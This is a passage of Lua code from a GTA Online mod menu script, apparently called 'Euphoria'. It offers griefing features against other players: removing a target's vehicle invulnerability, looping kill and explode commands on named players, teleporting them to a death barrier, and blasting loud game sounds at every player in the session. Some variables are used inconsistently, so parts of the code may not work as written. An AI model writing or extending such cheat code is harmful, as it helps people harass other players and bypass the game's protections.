            antigod:action("Teleport To Death Barrier", {}, "", function()
                players.teleport_3d(pid, -1141.5363, -2164.0615, 26.823051)
            end)

            antigod:toggle_loop("Remove Vehicle Godmode", {}, lang.get_localised(-748077967), function()
                local ped = GET_PLAYER_PED_SCRIPT_INDEX(playerID)
                if not IS_PED_IN_ANY_VEHICLE(ped) then
                    toast(lang.get_localised(PLYNVEH):gsub("{}", players.get_name(pid)))
                    glitchveh.value = false
                    util.stop_thread()
                end
                local vehicle = GET_VEHICLE_PED_IS_USING(ped)
                entities.request_control(vehicle, 2500)
                if IS_PED_IN_ANY_VEHICLE(ped) and not IS_PLAYER_DEAD(ped) then
                    SET_ENTITY_CAN_BE_DAMAGED(vehicle, true)
                    SET_ENTITY_INVINCIBLE(vehicle, false)
                    SET_ENTITY_PROOFS(vehicle, false, false, false, false, false, false, false, false)
                end
            end)

        -- Trolls
                toggle_loop(trolall, "Kill Loop", {"killloop"}, "Loops the 'Kill' option.", function()
                    yield(1000)
                    coms($"kill{name}")
                end)
                toggle_loop(trolall, "Explode Loop", {"explodeloop"}, "Loops the 'Explode' option.", function()
                    coms($"explode{name}")
                end)
                toggle(trolall, "[Shortcut] Force Cam Forward", {}, "Can also disable a player's invulnerability under some circumstances.", function()
                    coms($"confuse{name}")
                end)
        -- End

    end
        
        players.add_command_hook(player)
    kr()
-- Credits
    credits:hyperlink("Discord", "https://discord.gg/e9n67WfJ8y", "Join the official Euphoria discord.")
    credits:divider("Credits", "", function()
    end)
    credits:action("ScriptHostLocker", {}, "Its me :)", function()
    end)
    credits:action("Akolpa / AnyaSenpai-Chan", {}, "Used to be the dev of Euphoria, but left.", function()
    end)
-- Sounds

    kr()
    require("natives-1640181023")

    SoundAnnoy = {
        {"Boss_Message_Orange", "GTAO_Boss_Goons_FM_Soundset"},
        {"Checkpoint_Cash_Hit", "GTAO_FM_Events_Soundset"},
        {"Oneshot_Final", "MP_MISSION_COUNTDOWN_SOUNDSET"},
        {"Object_Collect_Player", "GTAO_FM_Events_Soundset"},
        {"10s", "MP_MISSION_COUNTDOWN_SOUNDSET"},
        {"5s", "MP_MISSION_COUNTDOWN_SOUNDSET"},
        {"RANK_UP", "HUD_AWARDS"},
        {"Bed", "WastedSounds"},
        {"Fire", "DLC_BTL_Terrobyte_Turret_Sounds"},
        {"Bomb_Disarmed", "GTAO_Speed_Convoy_Soundset"},
        {"Arming_Countdown", "GTAO_Speed_Convoy_Soundset"},
        {"Boss_Blipped", "GTAO_Magnate_Hunt_Boss_SoundSet"},
        {"Air_Defenses_Disabled", "DLC_sum20_Business_Battle_AC_Sounds"},
        {"Air_Defences_Activated", "DLC_sum20_Business_Battle_AC_Sounds"},
    }

    getPlayerPed = PLAYER.GET_PLAYER_PED
    getEntityCoords = ENTITY.GET_ENTITY_COORDS
    menuroot = menu.my_root()

    function AudioAnnoyance(Ker_SND, Ker_AUD)
        for i=0, 31, 1 do
            Ker_pped = getPlayerPed(i)
            Ker_pos = getEntityCoords(Ker_pped)
            AUDIO.PLAY_SOUND_FRONTEND(-1, Ker_SND, Ker_AUD, true)
            AUDIO.PLAY_SOUND_FROM_COORD(-1, Ker_SND, Ker_pos.x, Ker_pos.y, Ker_pos.z, Ker_AUD, true, 999999999, true)
        end
    end

    for i = 1, #SoundAnnoy do
        menu.action(soundsList, SoundAnnoy[i][1], {}, "", function()
            local snd, aud
            snd = tostring(SoundAnnoy[i][1])
            aud = tostring(SoundAnnoy[i][2])
            AudioAnnoyance(snd, aud)
        end)
    end
